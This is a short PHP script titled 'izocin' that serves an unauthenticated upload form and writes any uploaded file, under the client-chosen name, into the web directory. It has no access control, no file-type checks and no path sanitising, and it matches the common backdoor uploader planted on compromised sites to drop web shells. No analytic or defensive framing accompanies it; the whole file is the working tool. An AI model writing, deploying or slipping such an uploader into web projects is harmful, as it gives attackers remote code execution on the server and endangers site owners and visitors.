izocin
<?php
echo '<title>izocin</title>
<h1>izocin</h1>
';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Complate !!!</b><br><br>'; }
	else { echo '<b>Upload Failed !!!</b><br><br>'; }
}
?>